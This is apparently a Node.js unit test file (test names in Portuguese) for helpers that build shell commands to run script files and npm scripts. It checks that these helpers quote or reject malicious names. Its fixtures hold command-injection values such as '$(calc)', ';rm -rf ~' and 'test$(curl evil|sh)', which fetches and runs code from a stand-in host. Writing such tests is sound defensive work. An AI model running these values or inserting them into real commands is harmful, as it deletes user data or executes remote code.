const { test } = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { pathToFileURL } = require('node:url');

const load = () => import(pathToFileURL(path.join(__dirname, '../../src/renderer/scripts/task-utils.js')).href);

test('runFileCommand: interpretador por extensão (POSIX, aspas simples)', async () => {
  const { runFileCommand } = await load();
  assert.equal(runFileCommand('/w/a.js', 'linux'), "node '/w/a.js'");
  assert.equal(runFileCommand('/w/a.mjs', 'linux'), "node '/w/a.mjs'");
  assert.equal(runFileCommand('/w/a.cjs', 'darwin'), "node '/w/a.cjs'");
  assert.equal(runFileCommand('/w/a.ts', 'linux'), "npx tsx '/w/a.ts'");
  assert.equal(runFileCommand('/w/a.py', 'linux'), "python3 '/w/a.py'");
  assert.equal(runFileCommand('/w/a.sh', 'linux'), "bash '/w/a.sh'");
  assert.equal(runFileCommand('/w/a.txt', 'linux'), null);
  assert.equal(runFileCommand('/w/a.ps1', 'linux'), null);
});

test('runFileCommand: Windows usa python e PowerShell (& + aspas simples)', async () => {
  const { runFileCommand } = await load();
  assert.equal(runFileCommand('C:\\w\\a.py', 'win32'), "& python 'C:\\w\\a.py'");
  assert.equal(runFileCommand('C:\\w\\a.ps1', 'win32'), "& powershell -NoProfile -ExecutionPolicy Bypass -File 'C:\\w\\a.ps1'");
  assert.equal(runFileCommand('C:\\w\\a.js', 'win32', 'pwsh.exe'), "& node 'C:\\w\\a.js'");
  assert.equal(runFileCommand('C:\\w\\a.js', 'win32', 'C:\\Windows\\System32\\cmd.exe'), 'node "C:\\w\\a.js"');
  assert.equal(runFileCommand('C:\\w\\a.js', 'win32', 'bash'), "node 'C:\\w\\a.js'");
});

test('runFileCommand: nomes maliciosos não executam nada (POSIX)', async () => {
  const { runFileCommand } = await load();
  assert.equal(runFileCommand('/w/a$(calc).js', 'linux'), "node '/w/a$(calc).js'");
  assert.equal(runFileCommand("/w/a'b.js", 'linux'), "node '/w/a'\\''b.js'");
  assert.equal(runFileCommand('/w/x;rm -rf ~.js', 'linux'), "node '/w/x;rm -rf ~.js'");
  assert.equal(runFileCommand('/w/a "b" `c`.js', 'linux'), "node '/w/a \"b\" `c`.js'");
  assert.throws(() => runFileCommand('/w/a\nrm -rf ~.js', 'linux'), /caracteres de controle/);
});

test('runFileCommand: nomes maliciosos no PowerShell e no cmd', async () => {
  const { runFileCommand } = await load();
  assert.equal(runFileCommand('C:\\w\\a$(calc).js', 'win32'), "& node 'C:\\w\\a$(calc).js'");
  assert.equal(runFileCommand("C:\\w\\a'b.js", 'win32'), "& node 'C:\\w\\a''b.js'");
  assert.equal(runFileCommand('C:\\w\\x;rm -rf ~.js', 'win32'), "& node 'C:\\w\\x;rm -rf ~.js'");
  // aspas tipográficas também fecham string no PowerShell
  assert.equal(runFileCommand('C:\\w\\a\u2019b.js', 'win32'), "& node 'C:\\w\\a\u2019\u2019b.js'");
  for (const bad of ['C:\\w\\a%PATH%.js', 'C:\\w\\a^b.js', 'C:\\w\\a&calc.js', 'C:\\w\\a|b.js', 'C:\\w\\a"b.js']) {
    assert.throws(() => runFileCommand(bad, 'win32', 'cmd'), (err) => err.name === 'TaskCommandError' && /cmd/.test(err.message), bad);
  }
  assert.equal(runFileCommand('C:\\w\\a$(calc).js', 'win32', 'cmd'), 'node "C:\\w\\a$(calc).js"');
});

test('isRunnableFile: extensões com interpretador', async () => {
  const { isRunnableFile } = await load();
  assert.equal(isRunnableFile('/w/a.js'), true);
  assert.equal(isRunnableFile('/w/a.txt'), false);
  assert.equal(isRunnableFile('/w/a.ps1', 'linux'), false);
  assert.equal(isRunnableFile('C:\\w\\a.ps1', 'win32'), true);
});

test('shellKind: posix, powershell ou cmd', async () => {
  const { shellKind } = await load();
  assert.equal(shellKind('/bin/zsh', 'darwin'), 'posix');
  assert.equal(shellKind('', 'linux'), 'posix');
  assert.equal(shellKind('', 'win32'), 'powershell');
  assert.equal(shellKind('C:\\Program Files\\PowerShell\\7\\pwsh.exe', 'win32'), 'powershell');
  assert.equal(shellKind('cmd.exe', 'win32'), 'cmd');
  assert.equal(shellKind('wsl.exe', 'win32'), 'posix');
});

test('parseScripts: lista scripts do package.json', async () => {
  const { parseScripts } = await load();
  assert.deepEqual(parseScripts('{"scripts":{"build":"tsc","test":"node --test"}}'), [
    { name: 'build', command: 'tsc' },
    { name: 'test', command: 'node --test' },
  ]);
  assert.deepEqual(parseScripts('{}'), []);
  assert.deepEqual(parseScripts('{"scripts":[1]}'), []);
  assert.equal(parseScripts('não é json'), null);
});

test('npmRunCommand: só nomes seguros; o resto é recusado', async () => {
  const { npmRunCommand } = await load();
  assert.equal(npmRunCommand('build'), 'npm run build');
  assert.equal(npmRunCommand('test:unit'), 'npm run test:unit');
  assert.equal(npmRunCommand('@scope/x+y.z-w'), 'npm run @scope/x+y.z-w');
  for (const bad of ['test$(curl evil|sh)', 'a b', 'x;rm -rf ~', "a'b", '', 'a\nb']) {
    assert.throws(() => npmRunCommand(bad), (err) => err.name === 'TaskCommandError', JSON.stringify(bad));
  }
});
